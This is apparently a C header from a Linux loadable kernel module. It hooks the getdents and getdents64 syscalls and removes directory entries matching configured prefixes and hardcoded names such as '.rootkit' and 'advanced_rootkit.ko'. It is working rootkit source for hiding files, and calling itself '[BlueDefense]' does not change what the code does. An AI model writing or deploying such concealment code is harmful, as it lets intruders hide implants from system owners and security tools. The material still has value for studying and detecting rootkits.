#ifndef GETDENTS_H
#define GETDENTS_H

#include "../include/headers.h"

// Function pointers for original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);

// Global configuration
static char **g_hidden_prefixes = NULL;

void set_hidden_prefixes(char **prefixes) {
    g_hidden_prefixes = prefixes;
}

// Check if a file should be hidden based on prefixes
int should_hide_file(const char *name) {
    int i;
    
    if (!name || !g_hidden_prefixes)
        return 0;
    
    // Check against configured prefixes
    for (i = 0; g_hidden_prefixes[i] != NULL; i++) {
        if (strncmp(name, g_hidden_prefixes[i], strlen(g_hidden_prefixes[i])) == 0) {
            return 1;
        }
    }
    
    // Additional hardcoded patterns for security
    if (strstr(name, ".classified") || 
        strstr(name, ".secret") ||
        strstr(name, ".blueteam") ||
        strstr(name, "_defense") ||
        strstr(name, ".rootkit") ||
        strstr(name, ".hidden") ||
        strcmp(name, "advanced_rootkit.ko") == 0) {
        return 1;
    }
    
    return 0;
}

// Hook for getdents64 syscall (64-bit directory entries)
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_buffer = NULL;
    struct linux_dirent64 *current_entry = NULL;
    struct linux_dirent64 *prev_entry = NULL;
    long ret;
    unsigned long offset = 0;
    int entries_hidden = 0;
    
    // Call original syscall first
    ret = orig_getdents64(regs);
    if (ret <= 0) {
        return ret;
    }
    
    // Allocate kernel buffer with safety check
    if (ret > 32768) { // Reasonable size limit
        return ret;
    }
    
    kernel_buffer = kzalloc(ret, GFP_KERNEL);
    if (!kernel_buffer) {
        return ret; // Return original if allocation fails
    }
    
    // Copy from user space with error checking
    if (copy_from_user(kernel_buffer, user_dir, ret)) {
        kfree(kernel_buffer);
        return ret; // Return original on error
    }
    
    // Process directory entries with bounds checking
    while (offset < ret) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_buffer + offset);
        
        // Validate entry to prevent crashes
        if (current_entry->d_reclen == 0 || 
            current_entry->d_reclen > (ret - offset) ||
            offset + current_entry->d_reclen > ret) {
            break; // Invalid entry, stop processing
        }
        
        // Check if this entry should be hidden
        if (should_hide_file(current_entry->d_name)) {
            entries_hidden++;
            
            // Remove this entry
            if (offset == 0) {
                // First entry - shift everything left
                ret -= current_entry->d_reclen;
                memmove(kernel_buffer,
                       (char *)kernel_buffer + current_entry->d_reclen,
                       ret);
                continue; // Don't advance offset
            } else if (prev_entry) {
                // Middle/end entry - extend previous entry length
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }
        
        offset += current_entry->d_reclen;
    }
    
    // Copy modified buffer back to user space
    if (copy_to_user(user_dir, kernel_buffer, ret)) {
        kfree(kernel_buffer);
        return orig_getdents64(regs); // Fallback to original
    }
    
    kfree(kernel_buffer);
    
    if (entries_hidden > 0) {
        printk(KERN_DEBUG "[BlueDefense] Hidden %d directory entries\n", entries_hidden);
    }
    
    return ret;
}

// Hook for getdents syscall (32-bit directory entries)
static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    struct linux_dirent __user *user_dir = (struct linux_dirent __user *)regs->si;
    struct linux_dirent *kernel_buffer = NULL;
    struct linux_dirent *current_entry = NULL;
    struct linux_dirent *prev_entry = NULL;
    long ret;
    unsigned long offset = 0;
    int entries_hidden = 0;
    
    // Call original syscall first
    ret = orig_getdents(regs);
    if (ret <= 0) {
        return ret;
    }
    
    // Size safety check
    if (ret > 32768) {
        return ret;
    }
    
    kernel_buffer = kzalloc(ret, GFP_KERNEL);
    if (!kernel_buffer) {
        return ret;
    }
    
    // Copy from user space
    if (copy_from_user(kernel_buffer, user_dir, ret)) {
        kfree(kernel_buffer);
        return ret;
    }
    
    // Process directory entries
    while (offset < ret) {
        current_entry = (struct linux_dirent *)((char *)kernel_buffer + offset);
        
        // Validate entry
        if (current_entry->d_reclen == 0 || 
            current_entry->d_reclen > (ret - offset) ||
            offset + current_entry->d_reclen > ret) {
            break;
        }
        
        // Check if this entry should be hidden
        if (should_hide_file(current_entry->d_name)) {
            entries_hidden++;
            
            // Remove this entry
            if (offset == 0) {
                // First entry
                ret -= current_entry->d_reclen;
                memmove(kernel_buffer,
                       (char *)kernel_buffer + current_entry->d_reclen,
                       ret);
                continue;
            } else if (prev_entry) {
                // Middle/end entry
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }
        
        offset += current_entry->d_reclen;
    }
    
    // Copy back to user space
    if (copy_to_user(user_dir, kernel_buffer, ret)) {
        kfree(kernel_buffer);
        return orig_getdents(regs);
    }
    
    kfree(kernel_buffer);
    
    if (entries_hidden > 0) {
        printk(KERN_DEBUG "[BlueDefense] Hidden %d directory entries (32-bit)\n", entries_hidden);
    }
    
    return ret;
}

#endif // GETDENTS_H
